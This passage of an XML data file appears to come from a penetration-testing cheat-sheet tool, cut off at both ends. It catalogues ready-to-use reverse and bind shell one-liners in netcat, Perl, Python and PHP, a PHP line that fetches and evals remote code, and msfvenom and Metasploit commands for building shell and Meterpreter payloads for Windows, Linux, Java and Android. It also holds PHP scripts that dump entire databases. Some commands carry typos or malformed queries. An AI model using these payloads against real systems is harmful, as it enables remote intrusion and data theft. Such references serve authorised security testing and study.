    nc -n [return ip] [return port] -e /bin/sh

Build Script:
    msfvenom -p cmd/unix/reverse_netcat_gaping LHOST=[return ip] LPORT=[return port] -f raw

    
No (-e) Workaround
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/reverse_netcat
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Script:
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc -n [return ip] [return port] >/tmp/f

Build Script:
    msfvenom -p cmd/unix/reverse_netcat LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Netcat - Bind Shell">
            <info>Build a bind shell using Netcat.

Standard
-----------------------

Connector:
    nc [target ip] [listening port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/bind_netcat_gaping
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Script:
    nc -l -p [listening port] -e /bin/sh
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/bind_netcat_gaping LPORT=[listening port] -f raw
 
 
 No (-e) Workaround
 -----------------------
 
 Connector:
    nc [target ip] [listening port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/bind_netcat
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Script:
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc -n [return ip] [return port] >/tmp/f

Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/bind_netcat LPORT=[listening port] -f raw</info>
        </option>
        <option name="Netcat - Bind Shell on IPv6">
        <info>Build a bind shell using Netcat over IPv6.
            
Connector:
    nc [target ip] [listening port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/bind_netcat_gaping_IPv6
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Script:
    nc -6 -lp [listening port] -e /bin/sh

Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/bind_netcat_gaping_ipv6 LPORT=[listening port] -f raw</info>
        </option>
        <option name="Ncat - Reverse Shell with SSL">
            <info>Build a reverse shell with SSL encryption using Ncat.
            
Listener:
    ncat -l -p [return port] -e /bin/sh --allow [connecting ip] --ssl
    
Script:
    ncat [return ip] [return port] -ssl</info>
        </option>
        <option name="Ncat - Bind Shell with SSL">
            <info>Build a bind shell with SSL encryption using Ncat.
            
Connector:
    ncat [target ip] [listening port] --ssl
    
Script:
    ncat -l -p [listening port] -e /bin/sh --allow [connecting ip] --ssl</info>
        </option>
        <option name="Perl - Windows - Reverse Shell">
            <info>Build a reverse shell using Perl on a Windows machine.

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/reverse_perl
        set LHOST [return ip]
        set LPORT [return port]
        run')

Script:
    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[return ip]:[return port]");STDIN-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
    
Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/reverse_perl LHSOT=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Perl - Windows - Bind Shell">
            <info>Build a bind shell using Perl on a Windows machine..

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/bind_perl
        set LPORT [listening port]
        set RHOST [target ip]
        run')

Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/bind_perl LPORT=[listening port] -f raw</info>
        </option>
        <option name="Perl - Windows - Bind Shell on IPv6">
            <info>Build a bind shell using Perl over IPv6 on a Windows machine.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/bind_perl_ipv6
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/bind_perl_ipv6 LPORT=[listening port] -f raw</info>
        </option>
        <option name="Perl - Unix - Reverse Shell">
            <info>Build a reverse shell using Perl on a Unix machine.

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/reverse_perl
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Script:
    perl -e 'use Socket; $i="[return ip]"; $p=[return port]; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S"); open(STDOUT,"&gt;&amp;S"); open(STDERR,"&gt;&amp;S"); exec("/bin/sh -i");};'
(or)
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[return ip]:[return port]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'

Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_perl LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Perl - Unix - Reverse Shell with SSL">
            <info>Bulid a reverse shell using Perl wrapped in SSL on a Unix machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/reverse_perl_ssl
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_perl_ssl LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        
        <option name="Perl - Unix - Bind Shell">
            <info>Build a bind shell using Perl on a Unix machine.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/bind_perl
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/bind_perl LPORT=[listening port] -f raw</info>
        </option>
        <option name="Perl - Unix - Bind Shell on IPv6">
            <info>Build a bind shell using Perl over IPv6 on a Unix machine.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/bind_perl_ipv6
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/bind_perl_ipv6 LPORT=[listening port] -f raw</info>
        </option>
        <option name="Python - Reverse Shell">
            <info>Build a reverse shell using Python.

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
    
Script:
    (linux) python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("[return ip]",[return port])); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    
Build Script:
    msfvenom -a python --platform python -p python/shell_reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Python - Reverse Shell with SSL">
            <info>Build a reverse shell using Python wrapped in SSL.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLAOD python/shell_reverse_tcp_ssl
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a python --platform python -p python/shell_reverse_tcp_ssl LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Python - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell using Python.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a python --platform python -p python/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Python - Reverse Meterpreter over HTTP">
            <info>Build a reverse meterpreter shell over HTTP using Python.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a python --platform python -p python/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Python - Reverse Meterpreter over HTTPS">
            <info>Build a reverse meterpreter shell over HTTPS using Python.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a python --platform python -p python/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Python - Bind Meterpreter">
                <info>Build a bind meterpreter shell using Python.
                    
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD python/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a python --platform python -p python/meterpreter/bind_tcp_uuid LPORT=[listening port] -f raw</info>
        </option>
        <option name="PHP - Reverse Shell">
            <info>Build a reverse shell using PHP.
            
Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/reverse_php
        set LHOST [return ip]
        set LPORT [return port]
        run')
    
Script:
    (linux) php -r '$sock=fsockopen("[return ip]",[return port]);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
    
Build Script:
    msfvenom -a php --platform php -p php/reverse_php LHOST=[return ip] LPORT=[return port] -e php/base64
 -f raw</info>
        </option>
        <option name="PHP - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell using PHP.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a php --platform php -p php/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -e php/base64 -f raw</info>
        </option>
        <option name="PHP - Reverse Meterpreter - Web Delivery">
            <info>Build a reverse meterpreter shell using PHP to be delivered via url.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/script/web_delivery
	set TARGET 1
        set PAYLOAD php/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        run')
        
* command produced when listener created
        
Script:
    php -d allow_url_fopen=true -r "eval(file_get_contents('http://[return ip]:8080/[code]'));"</info>
        </option>
        <option name="PHP - Bind Shell">
            <info>Build a bind shell using PHP.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/bind_php
        set LPORT [listening port]
        set RHOST [target ip]
        run')
                
Build Script:
    msfvenom -a php --platform php -p php/bind_php LPORT=[listening port] -e php/base64 -f raw</info>
        </option>
        <option name="PHP - Bind Shell on IPv6">
            <info>Build a bind shell on IPv6 using PHP.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/bind_php_ipv6
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a php --platform php -p php/bind_php_ipv6 LPORT=[listening port] -e php/base64 -f raw</info>
        </option>
	<option name="PHP - Download and Execute">
	    <info>Download and execute a payload using PHP.
		    
Build Script:
	msfvenom -a php --platform php -p php/download_exec URL=[payload url] -e php/base64 -f raw</info>
	    </option>
        <option name="PHP - Dump MySQL">
            <info>Dump the contents of a MySQL database.
                
Configure and run this .php file in the browser.
                
&lt;?php
    $dbHost="[ip address]";
    $dbUser="[username]";
    $dbPass="[password]";
    $dbName="[database name]";
                
    echo "&lt;pre&gt;";
    $link=mysql_connect($dbHost,$dbUser,$dbPass);
    mysql_select_db($dbName,$link);
    $result=mysql_query("SHOW TABLES");
    while($row = mysql_fetch_row($result)){
        echo "--".$row[0]."\r\n";
        $result2=mysql_query("SELECT * FROM ".$row[0]);
        while($row2 = mysql_fetch_row($result2)){
            for($i=0;$i&lt;mysql_num_fields($result2);$i++){
                echo $row2[$i]."::";
            }echo "\r\n";
        }
    }
    echo "&lt;/pre&lt;";die;
?&gt;</info>
        </option>
        <option name="PHP - Dump MS-SQL">
            <info>Dump the contents of a MS-SQL database.
                
Configure and run this .php file in the browser.
                
&lt;?php
    $dbHost = "[ip address]";
    $dbUser = "[username]";
    $dbPass = "[password]";
    $dbName = "[database name]";
                
    echo "&lt;pre&gt;";
    $link = mssql_connect($dbHost, $dbUser, $dbPass) or die("Couldn't connect to SQL Server on $dbHost");
    mssql_select_db($dbName, $link) or die("Couldn't open database $dbName");
    $result = "SELECT * TABLE_NAME FROM information_schema.TABLES";
    while ($row = mssql_query($result)) {
        echo "--".$row[0]."\r\n";
        $result2 = mssql_query("SELECT * FROM ".$row[0]);
        while ($row2 = mssql_fetch_row($result2)) {
            for ($i=0;$i&lt;mssql_num_fields($result2);$i++) {
                echo $row2[$i]."::";
            }echo "\r\n";
        }
    }
    mssql_close($link);
    echo "&lt;/pre&gt;";die;
?&gt;</info>
        </option>
    </area>
    <area name="Payload - Binary">
        <option name="Windows (.exe) - Reverse Shell">
            <info>Build a reverse shell binary for a Windows machine.
      
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe
    
    
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe</info>
            
        </option>
        <option name="Windows (.exe) - Reverse Meterpreter Shell">
            <info>Build a reverse meterpreter shell binary for a Windows machine.

32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
            
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe
    
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe</info>
            
        </option>
        
        
        
        <option name="Windows (.exe) - Reverse Meterpreter Shell over HTTP">
            <info>Build a reverse meterpreter shell over HTTP binary for a Windows machine.
            
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe
    
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe</info>
        </option>
        <option name="Windows (.exe) - Reverse Meterpreter Shell over HTTPS">
            <info>Build a reverse meterpreter shell over HTTP binary for a Windows machine.
                
32 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe
                
64 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe</info>
        </option>
        <option name="Windows (.exe) - Bind Shell">
            <info>Build a bind shell binary for a Windows machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/shell/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/shell/bind_tcp_uuid LPORT=[listening port] -f exe -o [output].exe
    
64 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/shell/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/shell/bind_tcp_uuid LPORT=[listening port] -f exe -o [output].exe</info>
            </option>
        <option name="Windows (.exe) - Bind Meterpreter">
            <info>Build a bind meterpreter shell binary for a Windows machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp_uuid LPORT=[listening port] -f exe -o [output].exe
    
64 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp_uuid LPORT=[listening port] -f exe -o [output].exe</info>
        </option>
        <option name="Windows (.exe) - Bind Meterpreter on IPv6">
            <info>Build a bind meterpreter shell over ipv6 binary for a Windows machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/bind_ipv6_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_ipv6_tcp_uuid LPORT=[listening port] -f exe -o [output].exe
    
64 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/x64/meterpreter/bind_ipv6_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_ipv6_tcp_uuid LPORT=[listening port] -f exe -o [output].exe</info>
        </option>
        <option name="Unix/Java (.jar) - Reverse Shell">
            <info>Build a reverse shell binary for a Unix machine using Java.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/shell/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -p java/shell/reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw -o [output].jar</info>
        </option>
        <option name="Unix/Java (.jar) - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell binary for a Unix machine using Java.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/meterpreter/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -p java/meterpreter/reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw -o [output].jar</info>
        </option>
        <option name="Unix/Java (.jar) - Reverse Meterpreter over HTTP">
            <info>Build a reverse meterpreter shell over HTTP binary for a Unix machine using Java.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -p java/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f raw -o [output].jar</info>
        </option>
        <option name="Unix/Java (.jar) - Reverse Meterpreter over HTTPS">
            <info>Build a reverse meterpreter shell over HTTPS binary for a Unix machine using Java.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -p java/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f raw -o [output].jar</info>
        </option>
        <option name="Unix/Java (.jar) - Bind Shell">
            <info>Build a bind shell binary for a Unix machine using Java.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/shell/bind_tcp
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -p java/shell/bind_tcp LPORT=[listening port] -f raw -o [output].jar</info>
        </option>
        <option name="Unix/Java (.jar) - Bind Meterpreter">
            <info>Build a bind meterpreter shell binary for a Unix machine using Java.
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD java/meterpreter/bind_tcp
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -p java/meterpreter/bind_tcp LPORT=[listening port] -f raw -o [output].jar</info>
        </option>
        <option name="Linux (.elf) - Reverse Shell">
            <info>Build a reverse shell binary for a Linux machine.
                
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f elf -o [output].elf
    
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x64/shell/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=[return ip] LPORT=[return port] -f elf -o [output].elf</info>
            
        </option>
        <option name="Linux (.elf) - Reverse Shell on IPv6">
            <info>Build a reverse shell over ipv6 binary for a Linux machine.
                
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/reverse_ipv6_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_ipv6_tcp LHOST=[return ip] LPORT=[return port] -f elf -o [output].elf
    
64 bit
-----------------------

None, use regular shell.</info>
        </option>
        <option name="Linux (.elf) - Reverse Meterpreter Shell">
            <info>Build a reverse meterpreter shell binary for a Linux machine.
                
32 bit
-----------------------
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
                
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f elf -o [output].elf
                
64 bit
-----------------------

None, use regular shell.</info>
            
        </option>
        <option name="Linux (.elf) - Reverse Meterpreter Shell on IPv6">
            <info>Build a reverse meterpreter shell over ipv6 binary for a linux machine.
                
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/meterpreter/reverse_ipv6_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=[return ip] LPORT=[return port] -f elf -o [output].elf
    
64 bit
-----------------------

None, use regular shell.</info>
        </option>
        <option name="Linux (.elf) - Bind Shell">
            <info>Build a bind shell binary for a linux machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_tcp_uuid LPORT=[listening port] -f elf -o [output].elf
    
64 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x64/shell/bind_tcp'
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp LPORT=[listening port] -f elf -o [output].elf</info>
        </option>
        <option name="Linux (.elf) - Bind Shell on IPv6">
            <info>Build a bind shell over ipv6 binary for a linux machine.
                
32 bit
-----------------------
                
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/bind_ipv6_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
                
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_ipv6_tcp_uuid LPORT=[listening port] -f elf -o [output].elf
                
64 bit
-----------------------

None., use regular shell.</info>
        </option>
        <option name="Linux (.elf) - Bind Meterpreter">
            <info>Build a bind meterpreter shell binary for a linux machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp_uuid LPORT=[listening port] -f elf -o [output].elf
    
64 bit
-----------------------

None, use regular shell.</info>
        </option>
        <option name="Linux (.elf) - Bind Meterpreter on IPv6">
            <info>Build a bind meterpreter shell binary for a linux machine.
                
32 bit
-----------------------

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/meterpreter/bind_tcp_uuid
        set LPORT [listening port]
        set RHOST [target ip]
        run')
                
Build Payload:
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp_uuid LPORT=[listening port] -f elf -o [output].elf
                
64 bit
-----------------------
                
None, use regular shell.</info>
        </option>
        <option name="Android (.apk) - Reverse Shell">
            <info>Build a reverse shell binary for an Android machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/shell/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')

Build Payload:
    msfvenom -a dalvik --platform android -p android/shell/reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk

Sign APK:
    d2j-apk-sign -o [output].apk [input].apk</info>
        </option>
        <option name="Android (.apk) - Reverse Shell over HTTP">
            <info>Build a reverse shell over HTTP binary for an Android machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/shell/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')

Build Payload:
    msfvenom -a dalvik --platform android -p android/shell/reverse_http LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk

Sign APK:
    d2j-apk-sign -o [output].apk [input].apk</info>
        </option>
        <option name="Android (.apk) - Reverse Shell over HTTPS">
            <info>Build a reverse shell over HTTPS binary for an Android machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/shell/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')

Build Payload:
    msfvenom -a dalvik --platform android -p android/shell/reverse_https LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk

Sign APK:
    d2j-apk-sign -o [output].apk [input].apk</info>
        </option>
        <option name="Android (.apk) - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell binary for an Android machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/meterpreter/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')

Build Payload:
    msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk

Sign APK:
    d2j-apk-sign -o [output].apk [input].apk
            </info>
        </option>
        <option name="Android (.apk) - Reverse Meterpreter over HTTP">
            <info>Build a reverse meterpreter shell over HTTP binary for an Android machine.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/meterpreter/reverse_http
        set LHOST [return ip]
        set LPORT [return port]
        run')

Build Payload:
    msfvenom -a dalvik --platform android -p android/meterpreter/reverse_http LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk
    
Sign APK:
    d2j-apk-sign -o [output].apk [input].apk</info>
        </option>
        <option name="Android (.apk) - Reverse Meterpreter over HTTPS">
            <info>Build a reverse meterpreter shell over HTTPS binary for an Android machine.
            
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD android/meterpreter/reverse_https
        set LHOST [return ip]
        set LPORT [return port]
        run')
            
Build Payload:
    msfvenom -a dalvik --platform android -p android/meterpreter/reverse_https LHOST=[return ip] LPORT=[return port] -f raw -o [output].apk
            
Sign APK:
    d2j-apk-sign -o [output].apk [input].apk</info>
        </option>
        <option name="Web (.php) - Reverse Meterpreter">
            <info>Build a reverse meterpreter shell payload for PHP.
            
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD php/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Payload:
    msfvenom -a php --platform php -p php/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f raw -o [output].php</info>
        </option>
        <option name="Web (.php) - Bind Meterpreter">
            <info>Build a bind meterpreter shell payload for PHP.

Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
